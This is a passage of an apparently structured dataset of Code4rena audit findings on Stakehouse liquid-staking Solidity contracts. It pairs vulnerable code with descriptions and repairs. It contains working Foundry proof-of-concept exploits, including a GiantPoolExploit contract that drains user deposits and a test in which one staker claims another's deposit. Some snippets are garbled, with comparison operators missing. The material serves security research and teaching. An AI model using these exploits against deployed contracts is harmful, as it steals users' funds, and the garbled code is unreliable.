address\");\n    uint256 balance = _balance;\n    if (balance  0) {\n        // Calculate how much ETH rewards the address is owed / due \n        uint256 due = ((accumulatedETHPerLPShare * balance) / PRECISION) claimed[_user][_token];\n        if (due  0) {\n            claimed[_user][_token] = due;\n\n            totalClaimed += due;\n\n            (bool success, ) = _recipient.call{value: due}(\"\");\n            require(success, \"Failed to transfer\");\n\n            emit ETHDistributed(_user, _recipient, due);\n        }\n    }\n}\n\n\nTo ensure that rewards are distributed fairly, these functions are called before LP token balances are updated (e.g. when making a deposit StakingFundsVault.sol#L123(https://github.com/code-423n4/2022-11-stakehouse/blob/5f853d055d7aa1bebe9e24fd0e863ef58c004339/contracts/liquid-staking/StakingFundsVault.sol#L123)).\n\nHowever, this rewards accounting algorithm also counts deposited tokens:\n\n1.  to stake tokens, users call depositETHForStaking and send ETH ([StakingFundsVault.sol#L113(https://github.com/code-423n4/2022-11-stakehouse/blob/5f853d055d7aa1bebe9e24fd0e863ef58c004339/contracts/liquid-staking/StakingFundsVault.sol#L113));\n2.  updateAccumulatedETHPerLP is called in the function ([StakingFundsVault.sol#L123(https://github.com/code-423n4/2022-11-stakehouse/blob/5f853d055d7aa1bebe9e24fd0e863ef58c004339/contracts/liquid-staking/StakingFundsVault.sol#L123));\n3.  updateAccumulatedETHPerLP checks the balance of the contract, which *already includes the new staked amount* ([SyndicateRewardsProcessor.sol#L78(https://github.com/code-423n4/2022-11-stakehouse/blob/5f853d055d7aa1bebe9e24fd0e863ef58c004339/contracts/liquid-staking/SyndicateRewardsProcessor.sol#L78), SyndicateRewardsProcessor.sol#L94(https://github.com/code-423n4/2022-11-stakehouse/blob/5f853d055d7aa1bebe9e24fd0e863ef58c004339/contracts/liquid-staking/SyndicateRewardsProcessor.sol#L94)).\n4.  the staked amount is then counted in the accumulatedETHPerLPShare variable ([SyndicateRewardsProcessor.sol#L85(https://github.com/code-423n4/2022-11-stakehouse/blob/5f853d055d7aa1bebe9e24fd0e863ef58c004339/contracts/liquid-staking/SyndicateRewardsProcessor.sol#L85)), which is used to calculate the reward amount per LP share ([SyndicateRewardsProcessor.sol#L61(https://github.com/code-423n4/2022-11-stakehouse/blob/5f853d055d7aa1bebe9e24fd0e863ef58c004339/contracts/liquid-staking/SyndicateRewardsProcessor.sol#L61)).\n\nThis allows the following attack:\n\n1.  a user stakes 4 ETH to a BLS key;\n2.  the validator with the BLS key gets registered and its derivative tokens get minted;\n3.  a new user stakes some amount to a different BLS key;\n4.  the first user calls claimRewards and withdraws the stake of the new user.\n\nsolidity\n// test/foundry/StakingFundsVault.t.sol\nfunction testStealingOfDepositsByOldStakers_AUDIT() public {\n    // Resetting the mocks, we need real action.\n    MockAccountManager(factory.accountMan()).setLifecycleStatus(blsPubKeyOne, 0);\n    MockAccountManager(factory.accountMan()).setLifecycleStatus(blsPubKeyTwo, 0);\n    liquidStakingManager.setIsPartOfNetwork(blsPubKeyOne, false);\n    liquidStakingManager.setIsPartOfNetwork(blsPubKeyTwo, false);\n\n    // Aliasing accounts for better readability.\n    address nodeRunner = accountOne;\n    address alice = accountTwo;\n    address alice2 = accountFour;\n    address bob = accountThree;\n\n    // Node runner registers two BLS keys.\n    registerSingleBLSPubKey(nodeRunner, blsPubKeyOne, accountFive);\n    registerSingleBLSPubKey(nodeRunner, blsPubKeyTwo, accountFive);\n\n    // Alice deposits to the MEV+fees vault of the first key.\n    maxETHDeposit(alice, getBytesArrayFromBytes(blsPubKeyOne));\n\n    // Someone else deposits to the savETH vault of the first key.\n    liquidStakingManager.savETHVault().depositETHForStaking{value: 24 ether}(blsPubKeyOne, 24 ether);\n\n    // The first validator is registered and the derivatives are minted.\n    assertEq(vault.totalShares(), 0);\n    stakeAndMintDerivativesSingleKey(blsPubKeyOne);\n    assertEq(vault.totalShares(), 4 ether);\n\n    // Warping to pass the lastInteractedTimestamp checks.\n    vm.warp(block.timestamp + 1 hours);\n\n    // The first key cannot accept new deposits since the maximal amount was deposited\n    // and the validator was register. The vault however can still be used to deposit to\n    // other keys.\n\n    // Bob deposits to the MEV+fees vault of the second key.\n    maxETHDeposit(bob, getBytesArrayFromBytes(blsPubKeyTwo));\n    assertEq(address(vault).balance, 4 ether);\n    assertEq(bob.balance, 0);\n\n    // Alice is claiming rewards for the first key.\n    // Notice that no rewards were distributed to the MEV+fees vault of the first key.\n    assertEq(alice2.balance, 0);\n    vm.startPrank(alice);\n    vault.claimRewards(alice2, getBytesArrayFromBytes(blsPubKeyOne));\n    vm.stopPrank();\n\n    LPToken lpTokenBLSPubKeyOne = vault.lpTokenForKnot(blsPubKeyOne);\n\n    // Alice has stolen the Bob's deposit.\n    assertEq(alice2.balance, 4 ether);\n    assertEq(vault.claimed(alice, address(lpTokenBLSPubKeyOne)), 4 ether);\n    assertEq(vault.claimed(alice2, address(lpTokenBLSPubKeyOne)), 0);\n\n    assertEq(address(vault).balance, 0);\n    assertEq(bob.balance, 0);\n}\n\n\n",
                "Repair": "\nConsider excluding newly staked amounts in the accumulatedETHPerLPShare calculations.\n\nvince0656 (Stakehouse) confirmed duplicate issue #375(https://github.com/code-423n4/2022-11-stakehouse-findings/issues/375#issuecomment-1329427565)\n\n\n\n*\n\n\n"
            }
        ]
    },
    {
        "Code": "pragma solidity ^0.8.13;\n\n// SPDX-License-Identifier: MIT\n\ninterface ILiquidStakingManagerChildContract {\n    function liquidStakingManager() external view returns (address);\n}\n\npragma solidity ^0.8.13;\n\n// SPDX-License-Identifier: MIT\n\nimport { GiantLP } from \"./GiantLP.sol\";\nimport { StakingFundsVault } from \"./StakingFundsVault.sol\";\nimport { LPToken } from \"./LPToken.sol\";\nimport { GiantPoolBase } from \"./GiantPoolBase.sol\";\nimport { SyndicateRewardsProcessor } from \"./SyndicateRewardsProcessor.sol\";\nimport { LSDNFactory } from \"./LSDNFactory.sol\";\nimport { LPToken } from \"./LPToken.sol\";\nimport { ITransferHookProcessor } from \"../interfaces/ITransferHookProcessor.sol\";\n\n/// @notice A giant pool that can provide liquidity to any liquid staking network's staking funds vault\ncontract GiantMevAndFeesPool is ITransferHookProcessor, GiantPoolBase, SyndicateRewardsProcessor {\n\n    constructor(LSDNFactory _factory) {\n        lpTokenETH = new GiantLP(address(this), address(this), \"GiantETHLP\", \"gMevETH\");\n        liquidStakingDerivativeFactory = _factory;\n    }\n\n    /// @notice Stake ETH against multiple BLS keys within multiple LSDNs and specify the amount of ETH being supplied for each key\n    /// @dev Uses contract balance for funding and get Staking Funds Vault LP in exchange for ETH\n    /// @param _stakingFundsVault List of mev and fees vaults being interacted with\n    /// @param _ETHTransactionAmounts ETH being attached to each savETH vault in the list\n    /// @param _blsPublicKeyOfKnots For every staking funds vault, the list of BLS keys of LSDN validators receiving funding\n    /// @param _amounts List of amounts of ETH being staked per BLS public key\n    function batchDepositETHForStaking(\n        address[] calldata _stakingFundsVault,\n        uint256[] calldata _ETHTransactionAmounts,\n        bytes[][] calldata _blsPublicKeyOfKnots,\n        uint256[][] calldata _amounts\n    ) external {\n        uint256 numOfVaults = _stakingFundsVault.length;\n        require(numOfVaults > 0, \"Zero vaults\");\n        require(numOfVaults == _blsPublicKeyOfKnots.length, \"Inconsistent lengths\");\n        require(numOfVaults == _amounts.length, \"Inconsistent lengths\");\n        for (uint256 i; i < numOfVaults; ++i) {\n            // As ETH is being deployed to a staking funds vault, it is no longer idle\n            idleETH -= _ETHTransactionAmounts[i];\n\n            StakingFundsVault sfv = StakingFundsVault(payable(_stakingFundsVault[i]));\n            require(\n                liquidStakingDerivativeFactory.isLiquidStakingManager(address(sfv.liquidStakingNetworkManager())),\n                \"Invalid liquid staking manager\"\n            );\n\n            sfv.batchDepositETHForStaking{ value: _ETHTransactionAmounts[i] }(\n                _blsPublicKeyOfKnots[i],\n                _amounts[i]\n            );\n        }\n    }\n\n    /// @notice Allow a giant LP to claim a % of the revenue received by the MEV and Fees Pool\n    function claimRewards(\n        address _recipient,\n        address[] calldata _stakingFundsVaults,\n        bytes[][] calldata _blsPublicKeysForKnots\n    ) external {\n        uint256 numOfVaults = _stakingFundsVaults.length;\n        require(numOfVaults > 0, \"Empty array\");\n        require(numOfVaults == _blsPublicKeysForKnots.length, \"Inconsistent array lengths\");\n        for (uint256 i; i < numOfVaults; ++i) {\n            StakingFundsVault(payable(_stakingFundsVaults[i])).claimRewards(\n                address(this),\n                _blsPublicKeysForKnots[i]\n            );\n        }\n\n        updateAccumulatedETHPerLP();\n\n        _distributeETHRewardsToUserForToken(\n            msg.sender,\n            address(lpTokenETH),\n            lpTokenETH.balanceOf(msg.sender),\n            _recipient\n        );\n    }\n\n    /// @notice Preview total ETH accumulated by an address\n    function previewAccumulatedETH(\n        address _user,\n        address[] calldata _stakingFundsVaults,\n        LPToken[][] calldata _lpTokens\n    ) external view returns (uint256) {\n        require(_stakingFundsVaults.length == _lpTokens.length, \"Inconsistent array lengths\");\n\n        uint256 accumulated;\n        for (uint256 i; i < _stakingFundsVaults.length; ++i) {\n            accumulated = StakingFundsVault(payable(_stakingFundsVaults[i])).batchPreviewAccumulatedETH(\n                address(this),\n                _lpTokens[i]\n            );\n        }\n\n        return _previewAccumulatedETH(_user, address(lpTokenETH), lpTokenETH.balanceOf(_user), lpTokenETH.totalSupply(), accumulated);\n    }\n\n    /// @notice Any ETH supplied to a BLS key registered with a liquid staking network can be rotated to another key if it never gets staked\n    /// @param _stakingFundsVaults List of staking funds vaults this contract will contact\n    /// @param _oldLPTokens List of savETH vault LP tokens that the vault has\n    /// @param _oldLPTokens List of new savETH vault LP tokens that the vault wants to receive in exchange for moving ETH to a new KNOT\n    /// @param _amounts Amount of old being swapped for new per LP token\n    function batchRotateLPTokens(\n        address[] calldata _stakingFundsVaults,\n        LPToken[][] calldata _oldLPTokens,\n        LPToken[][] calldata _newLPTokens,\n        uint256[][] calldata _amounts\n    ) external {\n        uint256 numOfRotations = _stakingFundsVaults.length;\n        require(numOfRotations > 0, \"Empty arrays\");\n        require(numOfRotations == _oldLPTokens.length, \"Inconsistent arrays\");\n        require(numOfRotations == _newLPTokens.length, \"Inconsistent arrays\");\n        require(numOfRotations == _amounts.length, \"Inconsistent arrays\");\n        require(lpTokenETH.balanceOf(msg.sender) >= 0.5 ether, \"No common interest\");\n        for (uint256 i; i < numOfRotations; ++i) {\n            StakingFundsVault(payable(_stakingFundsVaults[i])).batchRotateLPTokens(_oldLPTokens[i], _newLPTokens[i], _amounts[i]);\n        }\n    }\n\n    /// @notice Any ETH that has not been utilized by a Staking Funds vault can be brought back into the giant pool\n    /// @param _stakingFundsVaults List of staking funds vaults this contract will contact\n    /// @param _lpTokens List of LP tokens that the giant pool holds which represents ETH in a staking funds vault\n    /// @param _amounts Amounts of LP within the giant pool being burnt\n    function bringUnusedETHBackIntoGiantPool(\n        address[] calldata _stakingFundsVaults,\n        LPToken[][] calldata _lpTokens,\n        uint256[][] calldata _amounts\n    ) external {\n        uint256 numOfVaults = _stakingFundsVaults.length;\n        require(numOfVaults > 0, \"Empty arrays\");\n        require(numOfVaults == _lpTokens.length, \"Inconsistent arrays\");\n        require(numOfVaults == _amounts.length, \"Inconsistent arrays\");\n        for (uint256 i; i < numOfVaults; ++i) {\n            StakingFundsVault(payable(_stakingFundsVaults[i])).burnLPTokensForETH(_lpTokens[i], _amounts[i]);\n        }\n    }\n\n    /// @notice Distribute any new ETH received to LP holders\n    function updateAccumulatedETHPerLP() public {\n        _updateAccumulatedETHPerLP(lpTokenETH.totalSupply());\n    }\n\n    /// @notice Allow giant LP token to notify pool about transfers so the claimed amounts can be processed\n    function beforeTokenTransfer(address _from, address _to, uint256) external {\n        require(msg.sender == address(lpTokenETH), \"Caller is not giant LP\");\n        updateAccumulatedETHPerLP();\n\n        // Make sure that `_from` gets total accrued before transfer as post transferred anything owed will be wiped\n        if (_from != address(0)) {\n            _distributeETHRewardsToUserForToken(\n                _from,\n                address(lpTokenETH),\n                lpTokenETH.balanceOf(_from),\n                _from\n            );\n        }\n\n        // Make sure that `_to` gets total accrued before transfer as post transferred anything owed will be wiped\n        _distributeETHRewardsToUserForToken(\n            _to,\n            address(lpTokenETH),\n            lpTokenETH.balanceOf(_to),\n            _to\n        );\n    }\n\n    /// @notice Allow giant LP token to notify pool about transfers so the claimed amounts can be processed\n    function afterTokenTransfer(address, address _to, uint256) external {\n        require(msg.sender == address(lpTokenETH), \"Caller is not giant LP\");\n        _setClaimedToMax(_to);\n    }\n\n    /// @notice Total rewards received by this contract from the syndicate excluding idle ETH from LP depositors\n    function totalRewardsReceived() public view override returns (uint256) {\n        return address(this).balance + totalClaimed - idleETH;\n    }\n\n    /// @dev On withdrawing LP in exchange for burning giant LP, claim rewards\n    function _onWithdraw(LPToken[] calldata _lpTokens) internal override {\n        // Use the transfer hook of LPToken to trigger the claiming accrued ETH\n        for (uint256 i; i < _lpTokens.length; ++i) {\n            _lpTokens[i].transfer(address(this), _lpTokens[i].balanceOf(address(this)));\n        }\n\n        _distributeETHRewardsToUserForToken(\n            msg.sender,\n            address(lpTokenETH),\n            lpTokenETH.balanceOf(msg.sender),\n            msg.sender\n        );\n    }\n\n    /// @dev On depositing on ETH set claimed to max claim so the new depositor cannot claim ETH that they have not accrued\n    function _onDepositETH() internal override {\n        _setClaimedToMax(msg.sender);\n    }\n\n    /// @dev Internal re-usable method for setting claimed to max for msg.sender\n    function _setClaimedToMax(address _user) internal {\n        // New ETH stakers are not entitled to ETH earned by\n        claimed[_user][address(lpTokenETH)] = (accumulatedETHPerLPShare * lpTokenETH.balanceOf(_user)) / PRECISION;\n    }\n}\n\n",
        "CodeNames": [
            "ILiquidStakingManagerChildContract.sol",
            "GiantMevAndFeesPool.sol"
        ],
        "VulnerabilityDesc": [
            {
                "Name": "H-17",
                "Location": [
                    "//solidity\nSavETHVault savETHPool = SavETHVault(_savETHVaults[i]);\nrequire(\n    liquidStakingDerivativeFactory.isLiquidStakingManager(address(savETHPool.liquidStakingManager())),\n    \"Invalid liquid staking manager\"\n);\n\n// Deposit ETH for staking of BLS key\nsavETHPool.batchDepositETHForStaking{ value: transactionAmount }(\n    _blsPublicKeys[i],\n    _stakeAmounts[i]\n);\n",
                    "//solidity\n// test/foundry/GiantPools.t.sol\ncontract GiantPoolExploit {\n    address immutable owner = msg.sender;\n    address validStakingManager;\n\n    constructor(address validStakingManager_) {\n        validStakingManager = validStakingManager_;\n    }\n\n    function liquidStakingManager() public view returns (address) {\n        return validStakingManager;\n    }\n\n    function batchDepositETHForStaking(bytes[] calldata /*_blsPublicKeyOfKnots*/, uint256[] calldata /*_amounts*/) external payable {\n        payable(owner).transfer(address(this).balance);\n    }\n}\n\nfunction testPoolDraining_AUDIT() public {\n    // Register BLS key\n    address nodeRunner = accountOne; vm.deal(nodeRunner, 12 ether);\n    registerSingleBLSPubKey(nodeRunner, blsPubKeyOne, accountFour);\n\n    // Set up users and ETH\n    address savETHUser = accountThree; vm.deal(savETHUser, 24 ether);\n\n    address attacker = address(0x1337);\n    vm.label(attacker, \"attacker\");\n    vm.deal(attacker, 1 ether);\n\n    // User deposits ETH into Giant savETH\n    vm.prank(savETHUser);\n    giantSavETHPool.depositETH{value: 24 ether}(24 ether);\n    assertEq(giantSavETHPool.lpTokenETH().balanceOf(savETHUser), 24 ether);\n    assertEq(address(giantSavETHPool).balance, 24 ether);\n\n    // Attacker deploys an exploit.\n    vm.startPrank(attacker);\n    GiantPoolExploit exploit = new GiantPoolExploit(address(manager));\n    vm.stopPrank();\n\n    // Attacker calls `batchDepositETHForStaking` to deposit ETH to their exploit contract.\n    bytes[][] memory blsKeysForVaults = new bytes[][(1);\n    blsKeysForVaults[0] = getBytesArrayFromBytes(blsPubKeyOne);\n\n    uint256[][] memory stakeAmountsForVaults = new uint256[][(1);\n    stakeAmountsForVaults[0] = getUint256ArrayFromValues(24 ether);\n\n    giantSavETHPool.batchDepositETHForStaking(\n        getAddressArrayFromValues(address(exploit)),\n        getUint256ArrayFromValues(24 ether),\n        blsKeysForVaults,\n        stakeAmountsForVaults\n    );\n\n    // Vault got nothing.\n    assertEq(address(manager.savETHVault()).balance, 0 ether);\n    // Attacker has stolen user's deposit.\n    assertEq(attacker.balance, 25 ether);\n}\n"
                ],
                "Type": " Giant pools can be drained due to weak vault authenticity check",
                "Description": "*Submitted by Jeiwan(https://github.com/code-423n4/2022-11-stakehouse-findings/issues/251), also found by Trust(https://github.com/code-423n4/2022-11-stakehouse-findings/issues/420), datapunk(https://github.com/code-423n4/2022-11-stakehouse-findings/issues/361), immeas(https://github.com/code-423n4/2022-11-stakehouse-findings/issues/325), JTJabba(https://github.com/code-423n4/2022-11-stakehouse-findings/issues/307), arcoun(https://github.com/code-423n4/2022-11-stakehouse-findings/issues/301), bin2chen(https://github.com/code-423n4/2022-11-stakehouse-findings/issues/282), imare(https://github.com/code-423n4/2022-11-stakehouse-findings/issues/266), wait(https://github.com/code-423n4/2022-11-stakehouse-findings/issues/258), unforgiven(https://github.com/code-423n4/2022-11-stakehouse-findings/issues/220), satoshipotato(https://github.com/code-423n4/2022-11-stakehouse-findings/issues/195), ronnyx2017(https://github.com/code-423n4/2022-11-stakehouse-findings/issues/166), Lambda(https://github.com/code-423n4/2022-11-stakehouse-findings/issues/139), hihen(https://github.com/code-423n4/2022-11-stakehouse-findings/issues/136), bitbopper(https://github.com/code-423n4/2022-11-stakehouse-findings/issues/128), fs0c(https://github.com/code-423n4/2022-11-stakehouse-findings/issues/122), banky(https://github.com/code-423n4/2022-11-stakehouse-findings/issues/112), 9svR6w(https://github.com/code-423n4/2022-11-stakehouse-findings/issues/96), c7e7eff(https://github.com/code-423n4/2022-11-stakehouse-findings/issues/87), perseverancesuccess(https://github.com/code-423n4/2022-11-stakehouse-findings/issues/61), 0xdeadbeef0x(https://github.com/code-423n4/2022-11-stakehouse-findings/issues/47), and clems4ever(https://github.com/code-423n4/2022-11-stakehouse-findings/issues/36)*\n\n<https://github.com/code-423n4/2022-11-stakehouse/blob/5f853d055d7aa1bebe9e24fd0e863ef58c004339/contracts/liquid-staking/GiantSavETHVaultPool.sol#L50<br\n<https://github.com/code-423n4/2022-11-stakehouse/blob/5f853d055d7aa1bebe9e24fd0e863ef58c004339/contracts/liquid-staking/GiantMevAndFeesPool.sol#L44\n\nAn attacker can withdraw all ETH staked by users in a Giant pool. Both GiantSavETHVaultPool and GiantMevAndFeesPool are affected.\n\n\nThe batchDepositETHForStaking function in the Giant pools check whether a provided vault is authentic by validating its liquid staking manager contract and sends funds to the vault when the check passes ([GiantSavETHVaultPool.sol#L48-L58(https://github.com/code-423n4/2022-11-stakehouse/blob/5f853d055d7aa1bebe9e24fd0e863ef58c004339/contracts/liquid-staking/GiantSavETHVaultPool.sol#L48-L58)):\n\nsolidity\nSavETHVault savETHPool = SavETHVault(_savETHVaults[i]);\nrequire(\n    liquidStakingDerivativeFactory.isLiquidStakingManager(address(savETHPool.liquidStakingManager())),\n    \"Invalid liquid staking manager\"\n);\n\n// Deposit ETH for staking of BLS key\nsavETHPool.batchDepositETHForStaking{ value: transactionAmount }(\n    _blsPublicKeys[i],\n    _stakeAmounts[i]\n);\n\n\nAn attacker can pass an exploit contract as a vault. The exploit contract will implement liquidStakingManager that will return a valid staking manager contract address to trick a Giant pool into sending ETH to the exploit contract:\n\nsolidity\n// test/foundry/GiantPools.t.sol\ncontract GiantPoolExploit {\n    address immutable owner = msg.sender;\n    address validStakingManager;\n\n    constructor(address validStakingManager_) {\n        validStakingManager = validStakingManager_;\n    }\n\n    function liquidStakingManager() public view returns (address) {\n        return validStakingManager;\n    }\n\n    function batchDepositETHForStaking(bytes[] calldata /*_blsPublicKeyOfKnots*/, uint256[] calldata /*_amounts*/) external payable {\n        payable(owner).transfer(address(this).balance);\n    }\n}\n\nfunction testPoolDraining_AUDIT() public {\n    // Register BLS key\n    address nodeRunner = accountOne; vm.deal(nodeRunner, 12 ether);\n    registerSingleBLSPubKey(nodeRunner, blsPubKeyOne, accountFour);\n\n    // Set up users and ETH\n    address savETHUser = accountThree; vm.deal(savETHUser, 24 ether);\n\n    address attacker = address(0x1337);\n    vm.label(attacker, \"attacker\");\n    vm.deal(attacker, 1 ether);\n\n    // User deposits ETH into Giant savETH\n    vm.prank(savETHUser);\n    giantSavETHPool.depositETH{value: 24 ether}(24 ether);\n    assertEq(giantSavETHPool.lpTokenETH().balanceOf(savETHUser), 24 ether);\n    assertEq(address(giantSavETHPool).balance, 24 ether);\n\n    // Attacker deploys an exploit.\n    vm.startPrank(attacker);\n    GiantPoolExploit exploit = new GiantPoolExploit(address(manager));\n    vm.stopPrank();\n\n    // Attacker calls batchDepositETHForStaking to deposit ETH to their exploit contract.\n    bytes[][] memory blsKeysForVaults = new bytes[][(1);\n    blsKeysForVaults[0] = getBytesArrayFromBytes(blsPubKeyOne);\n\n    uint256[][] memory stakeAmountsForVaults = new uint256[][(1);\n    stakeAmountsForVaults[0] = getUint256ArrayFromValues(24 ether);\n\n    giantSavETHPool.batchDepositETHForStaking(\n        getAddressArrayFromValues(address(exploit)),\n        getUint256ArrayFromValues(24 ether),\n        blsKeysForVaults,\n        stakeAmountsForVaults\n    );\n\n    // Vault got nothing.\n    assertEq(address(manager.savETHVault()).balance, 0 ether);\n    // Attacker has stolen user's deposit.\n    assertEq(attacker.balance, 25 ether);\n}\n\n\n",
                "Repair": "\nConsider taking a list of LiquidStakingManager addresses instead of vault addresses:\n\ndiff\n--a/contracts/liquid-staking/GiantSavETHVaultPool.sol\n+++ b/contracts/liquid-staking/GiantSavETHVaultPool.sol\n@@ -27,12 +28,12 @@ contract GiantSavETHVaultPool is StakehouseAPI, GiantPoolBase {\n     /// @param _blsPublicKeys For every savETH vault, the list of BLS keys of LSDN validators receiving funding\n     /// @param _stakeAmounts For every savETH vault, the amount of ETH each BLS key will receive in funding\n     function batchDepositETHForStaking(\n       address[] calldata _savETHVaults,\n+        address[] calldata _liquidStakingManagers,\n         uint256[] calldata _ETHTransactionAmounts,\n         bytes[][] calldata _blsPublicKeys,\n         uint256[][] calldata _stakeAmounts\n     ) public {\n       uint256 numOfSavETHVaults = _savETHVaults.length;\n+        uint256 numOfSavETHVaults = _liquidStakingManagers.length;\n         require(numOfSavETHVaults  0, \"Empty arrays\");\n         require(numOfSavETHVaults == _ETHTransactionAmounts.length, \"Inconsistent array lengths\");\n         require(numOfSavETHVaults == _blsPublicKeys.length, \"Inconsistent array lengths\");\n@@ -40,16 +41,18 @@ contract GiantSavETHVaultPool is StakehouseAPI, GiantPoolBase {\n\n         // For every vault specified, supply ETH for at least 1 BLS public key of a LSDN validator\n         for (uint256 i; i < numOfSavETHVaults; ++i) {\n+            require(\n+                liquidStakingDerivativeFactory.isLiquidStakingManager(_liquidStakingManagers[i]),\n+                \"Invalid liquid staking manager\"\n+            );\n+\n             uint256 transactionAmount = _ETHTransactionAmounts[i];\n\n             // As ETH is being deployed to a savETH pool vault, it is no longer idle\n             idleETH -= transactionAmount;\n\n           SavETHVault savETHPool = SavETHVault(_savETHVaults[i]);\n           require(\n               liquidStakingDerivativeFactory.isLiquidStakingManager(address(savETHPool.liquidStakingManager())),\n               \"Invalid liquid staking manager\"\n           );\n+            LiquidStakingManager liquidStakingManager = LiquidStakingManager(payable(_liquidStakingManagers[i]));\n+            SavETHVault savETHPool = liquidStakingManager.savETHVault();\n\n             // Deposit ETH for staking of BLS key\n             savETHPool.batchDepositETHForStaking{ value: transactionAmount }(\n\n\nvince0656 (Stakehouse) confirmed(https://github.com/code-423n4/2022-11-stakehouse-findings/issues/251#issuecomment-1329428177)\n\n\n\n*\n\n\n"
            }
        ]
    },
    {
        "Code": "pragma solidity ^0.8.13;\n\n// SPDX-License-Identifier: MIT\n\nimport { ReentrancyGuard } from \"@openzeppelin/contracts/security/ReentrancyGuard.sol\";\nimport { GiantLP } from \"./GiantLP.sol\";\nimport { LPToken } from \"./LPToken.sol\";\nimport { LSDNFactory } from \"./LSDNFactory.sol\";\n\ncontract GiantPoolBase is ReentrancyGuard {\n\n    /// @notice Emitted when an account deposits Ether into the giant pool\n    event ETHDeposited(address indexed sender, uint256 amount);\n\n    /// @notice Emitted when giant LP is burnt to recover ETH\n    event LPBurnedForETH(address indexed sender, uint256 amount);\n\n    /// @notice Emitted when giant LP is burnt to receive LP from a specific vault\n    event LPSwappedForVaultLP(address indexed vaultLPToken, address indexed sender, uint256 amount);\n\n    /// @notice Minimum amount of Ether that can be deposited into the contract\n    uint256 public constant MIN_STAKING_AMOUNT = 0.001 ether;\n\n    /// @notice Total amount of ETH sat idle ready for either withdrawal or depositing into a liquid staking network\n    uint256 public idleETH;\n\n    /// @notice LP token representing all ETH deposited and any ETH converted into savETH vault LP tokens from any liquid staking network\n    GiantLP public lpTokenETH;\n\n    /// @notice Address of the liquid staking derivative factory that provides a source of truth on individual networks that can be funded\n    LSDNFactory public liquidStakingDerivativeFactory;\n\n    /// @notice Add ETH to the ETH LP pool at a rate of 1:1. LPs can always pull out at same rate.\n    function depositETH(uint256 _amount) public payable {\n        require(msg.value >= MIN_STAKING_AMOUNT, \"Minimum not supplied\");\n        require(msg.value == _amount, \"Value equal to amount\");\n\n        // The ETH capital has not yet been deployed to a liquid staking network\n        idleETH += msg.value;\n\n        // Mint giant LP at ratio of 1:1\n        lpTokenETH.mint(msg.sender, msg.value);\n\n        // If anything extra needs to be done\n        _onDepositETH();\n\n        emit ETHDeposited(msg.sender, msg.value);\n    }\n\n    /// @notice Allow a user to chose to burn their LP tokens for ETH only if the requested amount is idle and available from the contract\n    /// @param _amount of LP tokens user is burning in exchange for same amount of ETH\n    function withdrawETH(uint256 _amount) external nonReentrant {\n        require(_amount >= MIN_STAKING_AMOUNT, \"Invalid amount\");\n        require(lpTokenETH.balanceOf(msg.sender) >= _amount, \"Invalid balance\");\n        require(idleETH >= _amount, \"Come back later or withdraw less ETH\");\n\n        idleETH -= _amount;\n\n        lpTokenETH.burn(msg.sender, _amount);\n        (bool success,) = msg.sender.call{value: _amount}(\"\");\n        require(success, \"Failed to transfer ETH\");\n\n        emit LPBurnedForETH(msg.sender, _amount);\n    }\n\n    /// @notice Allow a user to chose to withdraw vault LP tokens by burning their giant LP tokens. 1 Giant LP == 1 vault LP\n    /// @param _lpTokens List of LP tokens being owned and being withdrawn from the giant pool\n    /// @param _amounts List of amounts of giant LP being burnt in exchange for vault LP\n    function withdrawLPTokens(LPToken[] calldata _lpTokens, uint256[] calldata _amounts) external {\n        uint256 amountOfTokens = _lpTokens.length;\n        require(amountOfTokens > 0, \"Empty arrays\");\n        require(amountOfTokens == _amounts.length, \"Inconsistent array lengths\");\n\n        _onWithdraw(_lpTokens);\n\n        for (uint256 i; i < amountOfTokens; ++i) {\n            LPToken token = _lpTokens[i];\n            uint256 amount = _amounts[i];\n\n            _assertUserHasEnoughGiantLPToClaimVaultLP(token, amount);\n\n            // Burn giant LP from user before sending them an LP token from this pool\n            lpTokenETH.burn(msg.sender, amount);\n\n            // Giant LP tokens in this pool are 1:1 exchangeable with external savETH vault LP\n            token.transfer(msg.sender, amount);\n\n            emit LPSwappedForVaultLP(address(token), msg.sender, amount);\n        }\n    }\n\n    /// @dev Check the msg.sender has enough giant LP to burn and that the pool has enough savETH vault LP\n    function _assertUserHasEnoughGiantLPToClaimVaultLP(LPToken _token, uint256 _amount) internal view {\n        require(_amount >= MIN_STAKING_AMOUNT, \"Invalid amount\");\n        require(_token.balanceOf(address(this)) >= _amount, \"Pool does not own specified LP\");\n        require(lpTokenETH.lastInteractedTimestamp(msg.sender) + 1 days < block.timestamp, \"Too new\");\n    }\n\n    /// @dev Allow an inheriting contract to have a hook for performing operations post depositing ETH\n    function _onDepositETH() internal virtual {}\n\n    /// @dev Allow an inheriting contract to have a hook for performing operations during withdrawal of LP tokens when burning giant LP\n    function _onWithdraw(LPToken[] calldata _lpTokens) internal virtual {}\n}\n\npragma solidity ^0.8.13;\n\n// SPDX-License-Identifier: MIT\n\nimport { GiantLP } from \"./GiantLP.sol\";\nimport { StakingFundsVault } from \"./StakingFundsVault.sol\";\nimport { LPToken } from \"./LPToken.sol\";\nimport { GiantPoolBase } from \"./GiantPoolBase.sol\";\nimport { SyndicateRewardsProcessor } from \"./SyndicateRewardsProcessor.sol\";\nimport { LSDNFactory } from \"./LSDNFactory.sol\";\nimport { LPToken } from \"./LPToken.sol\";\nimport { ITransferHookProcessor } from \"../interfaces/ITransferHookProcessor.sol\";\n\n/// @notice A giant pool that can provide liquidity to any liquid staking network's staking funds vault\ncontract GiantMevAndFeesPool is ITransferHookProcessor, GiantPoolBase, SyndicateRewardsProcessor {\n\n    constructor(LSDNFactory _factory) {\n        lpTokenETH = new GiantLP(address(this), address(this), \"GiantETHLP\", \"gMevETH\");\n        liquidStakingDerivativeFactory = _factory;\n    }\n\n    /// @notice Stake ETH against multiple BLS keys within multiple LSDNs and specify the amount of ETH being supplied for each key\n    /// @dev Uses contract balance for funding and get Staking Funds Vault LP in exchange for ETH\n    /// @param _stakingFundsVault List of mev and fees vaults being interacted with\n    /// @param _ETHTransactionAmounts ETH being attached to each savETH vault in the list\n    /// @param _blsPublicKeyOfKnots For every staking funds vault, the list of BLS keys of LSDN validators receiving funding\n    /// @param _amounts List of amounts of ETH being staked per BLS public key\n    function batchDepositETHForStaking(\n        address[] calldata _stakingFundsVault,\n        uint256[] calldata _ETHTransactionAmounts,\n        bytes[][] calldata _blsPublicKeyOfKnots,\n        uint256[][] calldata _amounts\n    ) external {\n        uint256 numOfVaults = _stakingFundsVault.length;\n        require(numOfVaults > 0, \"Zero vaults\");\n        require(numOfVaults == _blsPublicKeyOfKnots.length, \"Inconsistent lengths\");\n        require(numOfVaults == _amounts.length, \"Inconsistent lengths\");\n        for (uint256 i; i < numOfVaults; ++i) {\n            